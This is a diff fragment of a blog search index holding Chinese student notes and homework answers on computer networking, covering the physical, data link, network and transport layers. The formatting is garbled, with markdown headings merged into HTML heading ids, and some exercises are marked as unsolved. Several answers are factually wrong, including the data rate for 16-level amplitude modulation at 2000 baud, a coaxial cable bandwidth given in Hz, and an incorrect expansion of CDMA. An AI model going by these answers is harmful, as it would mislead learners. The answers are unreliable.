双向交题通信 （半双工通信）A-&gt;B B&lt;-A * 双向同时通信 （全双工） A&lt;-&gt;B * 常用编码模式 *<br>不归0制 * 归0制 * 曼彻斯特编码 * 差分曼彻斯特 * 基本的带通调制方法 ### 信道的极限容量 信号在信道上传输会不可避免地产生失真。 带宽受限<br>有噪音 干扰和失真 * 信道能够通过的频率范围 * 奈氏准则 * 信噪比 * 香农公式 ## 物理层下面的传输媒介 * 引导性传输媒体 * 双绞线 *<br>同轴电缆 * 光缆 * 非导引型传输媒体 * 无线电波 ### 信道复用技术 频分复用、时分复用和统计时分复用 * 复用 （共享信道） ### 波分复用</p>
+<h3 id="码分复用-数字传输技术-宽带接入技术-ADSL技术-非对称数字用户线-光衔同轴混合网（HFC网）-FTTx技术"><a href="#码分复用-数字传输技术-宽带接入技术-ADSL技术-非对称数字用户线-光衔同轴混合网（HFC网）-FTTx技术" class="headerlink" title="码分复用 ## 数字传输技术 ## 宽带接入技术 ### ADSL技术 非对称数字用户线 ### 光衔同轴混合网（HFC网） ### FTTx技术"></a>码分复用 ## 数字传输技术 ## 宽带接入技术 ### ADSL技术 非对称数字用户线 ### 光衔同轴混合网（HFC网） ### FTTx技术</h3><h1 id="课后题-1-物理层要解决什么问题？物理层的主要特点是么？-物理层的主要任务就是确定与传输媒体的接口有关的一些特性。-物理层要解决的主要问题："><a href="#课后题-1-物理层要解决什么问题？物理层的主要特点是么？-物理层的主要任务就是确定与传输媒体的接口有关的一些特性。-物理层要解决的主要问题：" class="headerlink" title="课后题 1.物理层要解决什么问题？物理层的主要特点是么？ 物理层的主要任务就是确定与传输媒体的接口有关的一些特性。 物理层要解决的主要问题："></a>课后题 1.物理层要解决什么问题？物理层的主要特点是么？ 物理层的主要任务就是确定与传输媒体的接口有关的一些特性。 物理层要解决的主要问题：</h1><p>物理层要尽可能屏蔽掉物理设备、传输媒体和通信手段的不同，使上面的数据链路层感觉不到这些差异的存在，而专注于完成本曾的协议与服务。<br>给其服务用户（数据链路层）在一条物理的传输媒体上传送和接收比特流（一般为串行按顺序传的比特流）的能力。为此，物理层应解决物理连接的建立、维持和释放问题。<br>在两个相邻系统之间唯一地标识数据电路。 物理层的主要特点： 由于在OSI<br>之前，许多物理规程或协议已经制定出来了，而且在数据通信领域中，这些物理规程已被许多商品化的设备锁采用。加之，物理层协议涉及的范围广泛，所以至今没有按OSI<br>的抽象模型制定一套心的物理层协议，而是沿用已存在的物理规程，将物理层确定为描述与传输媒体接口的机械、电气、功能和规程特性。<br>由于物理连接的方式很多，传输媒体的种类也很多，因此，具体的物理协议相当复杂。 2规程与协议有什么区别？ 在数据通信的早期， 对通信所使用的各种规则都称为<br>“规程”（procedure），后来具有体系结构的计算机网络开始使用“协议”（protocol）这一名词，以前的“规程”其实就是“协议”，但由于习惯，对以前制定好的规程有时仍常用旧的名称“规程”。<br>3.试给出数据通信系统的模型并说明其主要组成构件的作用。 三大部分：源系统（或发送端、发送方）、传输系统（或传输网络）和目的系统（或接受端、接收方）<br>源系统： 源点 产生要传输的数据 发送器 编码源点产生的数字比特流编码 接收器 接受传送系统传来的信号，并解码 重点 接受接收器的数字比特流，并输出<br>4.试解释以下名词：数据、信号、模拟数据、模拟信 号、基带信号、带通信号、数字数据、数字信号、码元、 单工通信、半双工通信、全双工通信、串行传输、并行传<br>输。 数据：是运送信息的实体。 信号：则是数据的电气的或电磁的表现。 模拟数据：运送信息的模拟信号。 模拟信号：连续变化的信号。 基带信号：来自信源的信号。<br>带通信号：经过载波调制后的信号。 数字信号：取值为有限的几个离散值的信号。 数字数据：取值为不连续数值的数据。<br>码元：在使用时间域的波形表示数字信号时代表不同离散数值的基本波形 单工通信：即只有一个方向的通信而没有反方向的交互。<br>半双工通信：即通信和双方都可以发送信息，但不能双方同时发送（当然也不能同时接收）。这种通信方式是一发送另一方接收，过一段时间再反过来。<br>全双工通信：即通信的双方可以同时发送和接收信息。<br>基带信号（即基本频带信号）——来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。<br>带通信号——把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道 中传输（即仅在一段频率范围内能够通过信道） 。<br>5物理层的接口有哪几个特性？各包含什么内容？ 机械特性<br>指明接口所用接线器的形状和尺寸，引脚数目和排列，固定和锁定装置，等。平时常见的各种规格的接插件都有严格的标准化的规定 电气特性<br>指明在接口电缆的各条线上出现的电压的范围 功能特性 指明某条线上出现的某一电平的电压的意义 过程特性 指明对于不同功能的各种可能事件的出现顺序<br>6数据在信道中的传输速率受哪些因素的限制？信噪比能否任意提高？香农公式在数据通信中的意义是什么？ “比特/秒”和“码元/秒”有何区别？<br>信道能通过的频率范围和信噪比 由于噪声会使接收端对码元的判决产生错误（1 判决为0<br>或0判决为1）。所以信噪比要限制在一定范围内。由香农公式可知，信息传输速率由上限。信噪比越大，量化性能越好；均匀量化的输出信噪比随量化电平数的增加而提高；非均匀量化的信号量噪比，例如PCM<br>随编码位数N 指数规律增长，DPCM 与频率有关等。但实际信噪比不能任意提高，都有一定限制。例如增加电平数会导致接收机的成本提高，制作工艺复杂等。<br>香农公式的意义在于：只要信息传输速率低于信 道的极限信息传输速率，就一定可以找到某种方法来实现无差错的传输。 比特/秒是指信息传输速率，每秒钟传送的信息量；<br>码元/秒是码元传输速率，每秒钟传送的码元个数。 两者在二进制时相等。在多进制时，信息传输速率要乘以log 以2 为底的进制数等于码元传输速率 7<br>假定某信道受奈氏准则限制的最高码元速率为2000 码元/秒。如果采用振幅调制，把码元的振幅划分为16 个不同等级来传送，那么可以获得多高的数据率（b/s）？<br>80000 b/s 8 假定要用3kHz 贷款的电话信道传送64kb/s<br>的数据（无差错传输），试问这个信道应该具有多高的信噪比（分别用比值和分贝来表示），这个结果说明什么问题？ S/N=64.2dB 是个信噪比很高的信道<br>9用香农公式计算一下：假定信道带宽为3100Hz，最大信息传输速率为35kb/s，那么若想使最大信息传输速率增加60%。问信噪比S/N<br>应增大到多少倍？如果在刚才计算出的基础上将信噪比S/N 再增大到10 倍，问最大信息传输速率能否再增加20%？<br>奈氏准则：每赫带宽的理想低通信道是最高码元传输速率是每秒2 个码元。 香农公式表明了信道的带宽或信道中的信噪比越大，则信息的极限传输速率就越高。<br>根据香农公式，计算信道的极限信息传输速率C 为：C=log2(1+S/N）b/s;根据公式，可以计算出，信噪比S/N应增大到100<br>倍。如果在此基础上将信噪比S/N 再增大10 倍，最大信息速率只能再增加18.5%左右。 10 常用的传输媒体有哪几种？各有何特点？ 双绞线<br>双绞线分屏蔽双绞线和无屏蔽双绞线。由两根相互绝缘的导线组成。可以传输模拟信号，可以传输数字信号，有效带宽达250kHz，通常距离一般为几道十几公里。导线越粗其通信距离越远在数字传输时，若传输速率为每秒几兆比特，则传输距离可达几公里。一般用作电话线传输声音信号。虽然双绞线容易受到外部高频电磁波的干扰，误码率高，但因为其价格便宜，且安装方便，既适于点到点连接，又可用于多点连接，故仍被广泛应用。<br>同轴电缆<br>同轴电缆分基带同轴电缆和宽带同轴电缆，其结构是在一个包有绝缘的实心导线外，再套上一层外面也有一层绝缘的空心圆形导线。由于其高带宽（高达300~400Hz）、低误码率、性能价格比高，所以用作LAN<br>中。同轴电缆的最大传输距离随电缆型号和传输信号的不同而不同，由于易受低频干扰，在使用时多将信号调制在高频载波上。 光导纤维<br>光导纤维以光纤维载体，利用光的全反向原理传播光信号。其优点是直径小、质量轻：传播频带款通信容量大：抗雷电和电磁干扰性能好，五串音干扰、保密性好、误码率低。但光电接口的价格较昂贵。光纤被广泛用于电信系统铺设主干线。<br>无线电微波通信<br>无线电微波通信分为地面微波接力通信和卫星通信。其主优点是频率高、频带范围宽、通信信道的容量大；信号所受工业干扰较小、传播质量高、通信比较稳定；不受地理环境的影响，建设投资少、见效快。缺点是地面微波接力通信在空间是直线传播，传输距离受到限制，一般只有50km，隐蔽性和保密性较差；卫星通信虽然通信距离远且通信费用与通信距离无关，但传播时延较大，技术较复杂，价格较贵。<br>13 为什么要使用信道复用技术？常用的信道复用技术有哪些？<br>信道复用的目的是让不同的计算机连接到相同的信道上,以共享信道资源。在一条传输介质上传输多个信号,提线路的利用率，降低网络的成本。这种共享技术就是多路复技术。<br>频分复用 时分复用 统计时分复用 波分复用 码分复用 14 试写出下列英文缩写的全文，并进行简单的解释。<br>FDM，TDM，STDM，WDM，DWDM，CDMA，SONET，SDH，STM-1，OC-48 FDM(frequency division<br>multiplexing)频分复用 TDM(Time Division Multiplexing)时分复用 STDM(Statistic Time<br>Division Multiplexing)统计时分复用， WDM(Wave Division Multiplexing)波分复用， DWDM(Dense<br>Wave Division Multiplexing)密集波分复用， CDMA(Code Wave Division Multiplexing)码分多址<br>SONET(Synchronous Optical Network)同步光纤网， SDH(Synchronous Digital<br>Hierarchy)同步数字系列 STM-1(Synchronous Transfer Module)第1 级同步传递模块 <strong>OC-48</strong><br>（Optical Carrier）第48级光载波，是SONET体系中的速率表示，对应于SDH的STM-16速率，常用近似值2.5Gb/s # 第三章<br>数据链路层 ## 点对点信道 ### 数据链路和帧 ### 三个基本问题 封装成帧 透明传输 差错校验 #### 广播信道 ## 点对点协议PPP<br>ppp协议是用户和ISP通信所使用的数据链路层协议 * 需求 * 组成 ### 帧格式 * 字段意义 * 字节填充 *<br>当PPP异步传输时，把转义符定义威0x7d，并使用字节填充 * 把信息字段中每个0x7E字节转变成为2字节序列（0x7D,0X5E） *<br>若信息字段中出现一个0X7D的字节，则把0x7D转变成为2字节序列（0x7D，0x5D） *<br>出现小于0x20的字符，在字符钱加入0x7d字节，同时该字符的编码加以改变。 * 零比特填充 *<br>在发送端，扫描信息字段，只要发现5个连续1，填入一个0，这样就不会出现6个连续1.接收端在收到一个帧事，找到标志字段F以确定一个帧的边界，再把添加0删掉</p>
+<h3 id="PPP协议工作状态-使用广播信道的数据链路层-局域网的数据链路层-局域网广播信道-以太网的两个标准-适配器的作用"><a href="#PPP协议工作状态-使用广播信道的数据链路层-局域网的数据链路层-局域网广播信道-以太网的两个标准-适配器的作用" class="headerlink" title="PPP协议工作状态 ## 使用广播信道的数据链路层 ### 局域网的数据链路层 局域网广播信道 * 以太网的两个标准 * 适配器的作用 *"></a>PPP协议工作状态 ## 使用广播信道的数据链路层 ### 局域网的数据链路层 局域网广播信道 * 以太网的两个标准 * 适配器的作用 *</h3><p>帧通过网卡发出 ### CSMA/CD协议 * 要点 * 多点接入 * 载波监听 * 碰撞检测（边发边监听） ### 使用集线器的星形拓扑 ###<br>以太网的信道利用率 a = 单程端到端时延 <strong>/</strong> 帧的发送时间 利用率 = 真的发送时间/（单程端到端时延+帧的发送时间）= 1/1+a ###<br>以太网的MAC层 1. MAC层的硬件地址 1. MAC地址称为硬件地址或物理地址 实际上就是适配器地址或适配器标识符。 2. MAC帧的格式 1.<br>DIX Ethernet V2 2. IEEE 802.3 ## 扩展的以太网 ### 在物理层扩展以太网 连个光纤 ### 在数据链路层扩展以太网 *<br>以太网交换机的特点 * 以太网交换机的自学习功能 * 记录路由表 * 从总线以太网到星形以太网 ### 虚拟局域网 * 划VLAN ## 高速以太网 ##<br>课后题 1.数据链路（即逻辑链路）与链路（即物理链路）有何区别？“电路接通了”与“数据链路接通了”的区别何在？<br>数据链路与链路的区别在于数据链路除链路外，还必须有一些必要的规程来控制数据的传输。因此，数据链路比链路多了实现通信规程所需要的硬件和软件。<br>2.数据链路层的链路控制包括哪些功能？讨论数据链路层做成可靠的链路层有哪些优缺点？<br>数据链路层的主要功能是在物理层提供的比特服务基础上，在相邻结点之间提供简单的通信链路，传输以帧为单位的数据，同时它还负责数据链路的流量控制、差错控制。具体地：链路管理；帧同步；流量控制；差错控制；将数据和控制信息分开；透明传输；寻址等。<br>3。网络适配器的作用是什么？网络适配器工作在哪一层？ 它使得用户可以通过电缆或无线相互连接。工作在数据链路层<br>4.数据链路层的三个基本问题为什么都必须加以解决？？？ 都和数据的传输密切相关，不解决无法传输 5.如果在数据链路层不进行封装成帧，会发生什么问题？<br>封装目的ip、源ip、类型、数据报、FCS，不知道帧发送去哪，接收时无法分辨帧的尾部，无法校验帧的正确性。<br>6.ppp协议的主要特点是什么？为什么ppp不适用帧的编号？ppp适用于什么情况，为什么ppp不能使数据链路层实现可靠传输？<br>ppp只提供了检错功能，当出现帧错误时，只是将其丢弃 PPP帧没有使用序号，接收端不能通过序号确认帧的顺序和是否完全到达。<br>7.要发送的数据为1101011011。采用CRC的生成多项式是P（X）=X4+X+1。试求应添加在数据后面的余数。数据在传输过程中最后一个1变成了0，问接收端能否发现？若数据在传输过程中最后两个1都变成了0，问接收端能否发现？采用CRC检验后，数据链路层的传输是否就变成了可靠的传输？<br>不可靠传输 8要发送的数据为101110。采用CRC的生成多项式是P（X）=X3+1。试求应添加在数据后面的余数。 101110除1001 = 011<br>9.一个PPP帧的数据部分（用十六进制写出）是7D 5E FE 27 7D 5D 7D 5D 65 7D 5E试问真正的数据是什么（用十六进制写出）？<br>（这个不会） 10<br>PPP协议使用同步传输技术传送比特串0110111111111100。试问经过零比特填充后变成怎样的比特串？若接收端收到的PPP帧的数据部分是0001110111110111110110，问删除发送端加入的零比特后变成怎样的比特串？<br>（这个也不会） 11 试分别讨论一下各种情况在什么条件下是透明传输，在什么条件下不是透明传输。（提示：请弄清么是“透明传输”，然后考虑能否满足其条件。）<br>普通的电话通信 互联网提供的电子邮件服务。 12<br>PPP协议的工作状态有哪几种？当用户要使用PPP协议和ISP建立连接进行通信需要建立哪几种连接？每一种连接解决什么问题？<br>链路静止，链路建立，鉴别，网络层协议，链路打开，链路终止 建立和鉴别两种连接 链路静止：链路没有被使用，物理层无活动载体，链路处于静默状态。<br>链路建立：当其中一端要进行通信时，将进入建立连接段，建立链路层的 LCP 连接；双方进行协商。如果协商成功，系统将进入认证阶段或直接进入联网阶段。<br>鉴别：双方发送一些包进行认证。如果认证通过则进入联网阶段，否则终止连接。<br>网络层协议：协商网络层协议。PPP规定双方在进行网络层数据交换之前要达成一致，因为PPP支持网络层运行多个协议，接收方需要知道用哪个协议来接收数据。<br>链路打开：开始交换用户数据和控制包。链路一直保持连接直到其中一方希望终止为止。 链路终止：通信双方交换一些分组以消除和终止连接。 13<br>局域网的主要特点是什么？为什么局域网采用广播通信方式而广域网不采用呢？ 局域网是指在较小的地理范围内，将有限的通信设备互联起来的计算机通信网络<br>覆盖的地理范围较小，一般为10m～10km（如一幢办公楼，一个企业内等），通常为一个单位所拥有。<br>具有较高的数据传输率（通常为1～20Mbps，高速局域网可达100Mbps）。 具有较低的误码率，一般在10-8到10-11之间。 具有较低的时延。<br>通常多个站共享一个传输媒体（同轴电缆，双绞线，光纤）。 在局域网中各站通常进行一对多访问，随机使用信道，共享通信媒体，采用广播通信<br>方式是最合适的，且LAN中站点较少，带宽相对较大，也适宜于使用广播方式通信。 在广域网中用户数较多，若采取广播通信，会造成混乱，校率低。<br>14常用的局域网的网络拓扑有哪些种类？现在最流行的是哪种结构？为什么早期的以 太网选择总线拓扑结构而不是星形拓扑结构，但现在却改为使用星形拓扑结构？<br>星形网，总线网，环形网，树形网 当时星形拓扑结构较贵，人们都认为总线结构更加可靠，但是实践证明总线结构容易出问题。<br>15.什么叫做传统以太网？以太网有哪两个主要标准？ DIX Ethernet V2 标准的局域网 DIX Ethernet V2 标准与 IEEE<br>的802.3 标准 16.数据率为10Mb/s的以太网在物理媒体上的码元传输速率是多少码元/秒？ 20<br>17.为什么LLC子层的标准已制定出来了但现在却很少使用？ 由于 TCP/IP 体系经常使用的局域网是 DIX Ethernet V2 而不是 802.3<br>标准中的几种局域网，因此现在 802 委员会制定的逻辑链路控制子层 LLC（即 802.2<br>标准）的作用已经不大了，且多生产商生产的适配器上也仅装有MAC协议而没有LLC 18。试说明10BASE-T中的“10”、“BASE”和“T”所代表的意思。<br>10代表信号在电缆上的传输速率位10Mps，“base”比表示电缆上的信号是基带信号。“T”代表双绞线星星网 19<br>以太网使用的CSMA/CD协议是以争用方式接入到共享信道。这与传统的时分复用TDM相比优缺点如何？<br>传统的时分复用TDM是静态时隙分配，均匀高负荷时信道利用率高，低负荷或符合不均匀时资源浪费较大，CSMA/CD采用发送前先监听信道，当信道空闲时再分配资源的方式进行工作，低负荷时信道利用率高，但控制复杂，高负荷时信道冲突大。</p>
+<h1 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层 "></a>第四章 网络层 <img src="https://uploader.shimo.im/f/0xYyQrObH6XPJQez.png!thumbnail" alt="图片"></h1><p>网络层提供的两种服务 * 虚电路 * 数据包 ## 网络协议IP ### 虚拟互联网络 * 中间设备 * 物理层 转发器 * 数据链路层 网桥 or 桥接器</p>
+<ul>
+<li>网络层 路由器 * 网络层以上 网关 ### 分类的IP地址 * IP地址及其表示方法 * 分类的IP地址 * ABCDE * 子网的划分 * 构成超网<h3 id="IP地址与硬件地址-物理地址是数据链路层和物理层使用的地址，而IP地址是网络层和以上各层使用的地址，是一种逻辑地址。"><a href="#IP地址与硬件地址-物理地址是数据链路层和物理层使用的地址，而IP地址是网络层和以上各层使用的地址，是一种逻辑地址。" class="headerlink" title="IP地址与硬件地址 物理地址是数据链路层和物理层使用的地址，而IP地址是网络层和以上各层使用的地址，是一种逻辑地址。"></a>IP地址与硬件地址 物理地址是数据链路层和物理层使用的地址，而IP地址是网络层和以上各层使用的地址，是一种逻辑地址。</h3>在IP层抽象的互联网上只能看到IP数据报 路由器只根据目的站的IP网络地址进行路由选择 在局域网的链路层，只能看见MAC帧 ### 地址解析协议ARP<br>ARP广播 ### IP数据报的格式<br><img src="https://uploader.shimo.im/f/x3Lpv3X0runvkii6.png!thumbnail" alt="图片"> ###<br>IP层转发分组的流程 ## 划分子网和构造超网 ### 划分子网 * 从两级IP地址到三级IP地址 * IP地址空间利用率有时很低 *<br>路由表过大损害网络性能 * 两级IP地址不够灵活 * &lt;网络号&gt;&lt;子网号&gt;&lt;主机号&gt; * 子网掩码 ### 使用子网时分组的转发 * 路由表包含的三项内容<br>目的网络地址，子网掩码，下一跳地址 ### 无分类编址CIDR（构造超网） * 网络前缀 ## 网际控制报文协议ICMP ### ICMP报文的种类 *<br>ICMP差错报告报文 * ICMP询问报文 ### ICMP的应用举例 ## 互联网的路由选择协议 ### 有关路由选择协议的几个基本概念 1.<br>立项的路由算法 1. 完整正确 2. 计算简单 3. 适应通信量和网络拓扑的变化 4. 稳定 5. 公平 6. 最佳 2.<br>分层次的路由选择协议 ### 内部网关协议RIP 1. 工作原理 1. 基于距离向量的路由选择协议 2. 距离向量算法 3. RIP协议的报文格式<h3 id="内部网关协议OSPF-1-基本特点-1-层次结构的区域划分-外部网关协议BGP-路由器的构成-IPV6-IP多播"><a href="#内部网关协议OSPF-1-基本特点-1-层次结构的区域划分-外部网关协议BGP-路由器的构成-IPV6-IP多播" class="headerlink" title="内部网关协议OSPF 1. 基本特点 1. 层次结构的区域划分 ### 外部网关协议BGP ### 路由器的构成 ## IPV6 ## IP多播"></a>内部网关协议OSPF 1. 基本特点 1. 层次结构的区域划分 ### 外部网关协议BGP ### 路由器的构成 ## IPV6 ## IP多播</h3><h3 id="虚拟专用网VPN和网络地址转换NAT-第五章-运输层-运输层协议概述-进程之间的通信-运输层像它上面的应用层提供通信服务"><a href="#虚拟专用网VPN和网络地址转换NAT-第五章-运输层-运输层协议概述-进程之间的通信-运输层像它上面的应用层提供通信服务" class="headerlink" title="虚拟专用网VPN和网络地址转换NAT # 第五章 运输层 ## 运输层协议概述 ### 进程之间的通信 运输层像它上面的应用层提供通信服务"></a>虚拟专用网VPN和网络地址转换NAT # 第五章 运输层 ## 运输层协议概述 ### 进程之间的通信 运输层像它上面的应用层提供通信服务</h3>复用和分用 不通的应用进程得到不同的数据 网络层为主机之间提供逻辑通信，运输层为应用进程之间提供端到端的逻辑通信 ### 运输层的两个主要协议<br>用户数据报协议UDP 不需要先建立连接 传输控制协议TCP 提供面向链接的服务 ### 运输层的端口 ## 用户数据报协议UDP ### 概述 1.<br>UDP是无连接的 2. 尽最大努力缴费 3. 面向报文 一次交付一个完整的报文 4. 没有拥塞控制 5.<br>支持一对一，一对多，多对一，多对多的交互通信 6. 首部开销 ### 首部格式 1. 源端口 2. 目的端口 3. 长度 4. 检验和 出错就丢弃<h2 id="传输控制协议TCP概述-主要特点-1-面向连接的运输层协议-2-每一条TCP连接只能由两个端点，只能一对一-3-可靠交付"><a href="#传输控制协议TCP概述-主要特点-1-面向连接的运输层协议-2-每一条TCP连接只能由两个端点，只能一对一-3-可靠交付" class="headerlink" title="传输控制协议TCP概述 ### 主要特点 1. 面向连接的运输层协议 2. 每一条TCP连接只能由两个端点，只能一对一 3. 可靠交付"></a>传输控制协议TCP概述 ### 主要特点 1. 面向连接的运输层协议 2. 每一条TCP连接只能由两个端点，只能一对一 3. 可靠交付</h2>通过tcp的数据，无差错，不丢失，不重复，按序到达 4. 提供全双工通信 5. 面向字节流 ### TCP的连接 ip：端口 ## 可靠传输的工作原理<br>tcp采取措施使两个传输层之间的通信变得可靠 特点： 传输信道不产生差错 不管发送方以多块的速度发送数据，接收方总是来的及处理收到的数据 ###<br>停止等待协议 1. 无差错情况 2. 出现差错 1. A在发送完一个分组后，必须暂时保留已发动的分组的副本 2. 分组和确认分组必循进行编号 3.<br>超市计时器设置的重传时间应当比数据在分组传输的平均往返时长长一点 3. 确认丢失和确认迟到 1. 确认丢失 丢弃这个重复的分组，并重传确认 2.<br>确认迟到 丢弃重复分组，重传确认 收到确认后什么都不做 3. 通过以上的确认和重传机制，可以在不可靠的传输网络上实现可靠的通信，曾为自动重传请求 4.<br>信道利用率 1. 利用率=(分组需要时间)/经过时间 2. 经过时间=需要时间+往返时间+确认分组需要时间 3. 流水线传输可以提高信道利用率 ###<br>连续ARQ协议 滑动窗口协议 正常情况<br>发送方几个分组连续发送出去，接受方返回确认，并且可以只发送一个确认。接受方收到确认，再发几个分组出去。如果接受方只接收到部分数据 ##<br>TCP报文段的首部格式 1. 源端口和目的端口 2. 序号 3. 确认号 4. 数据偏移 5. 保留 6. 紧急URG 7. 确认ACK<br>8. 推送PSH 9. 复位RST 10. 同步SYN 11. 终止FIN 12. 窗口 13. 检验和 14. 紧急指针 15. 选项<h2 id="TCP可靠传输的实现-以字节为单位的滑动窗口-超时重传时间的选择-比往返时间RTT长一点-选择确认SACK"><a href="#TCP可靠传输的实现-以字节为单位的滑动窗口-超时重传时间的选择-比往返时间RTT长一点-选择确认SACK" class="headerlink" title="TCP可靠传输的实现 ### 以字节为单位的滑动窗口 ### 超时重传时间的选择 比往返时间RTT长一点 ### 选择确认SACK"></a>TCP可靠传输的实现 ### 以字节为单位的滑动窗口 ### 超时重传时间的选择 比往返时间RTT长一点 ### 选择确认SACK</h2>TCP的流量控制 ### 利用滑动窗口实现流量控制 流量控制就是发送方别发的太快，让接收方来得及接接收 发送方的发送窗口不能超过接受方给出的接收窗口的数值<h3 id="TCP的传输效率-TCP的拥塞控制-拥塞控制的一般原理-对资源的需求总和-gt-可用资源-TCP的拥塞控制方法"><a href="#TCP的传输效率-TCP的拥塞控制-拥塞控制的一般原理-对资源的需求总和-gt-可用资源-TCP的拥塞控制方法" class="headerlink" title="TCP的传输效率 ## TCP的拥塞控制 ### 拥塞控制的一般原理 对资源的需求总和 &gt; 可用资源 ### TCP的拥塞控制方法"></a>TCP的传输效率 ## TCP的拥塞控制 ### 拥塞控制的一般原理 对资源的需求总和 &gt; 可用资源 ### TCP的拥塞控制方法</h3>主动队列管理AQM ## TCP的运输连接管理 # 第六章 应用层 ## 网络应用层模型 ## DNS系统 ## 文件传输协议FTP ## 电子邮件 ##<br>万维网和HTTP协议</li>
+</ul>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
       </tags>
   </entry>
 </search>
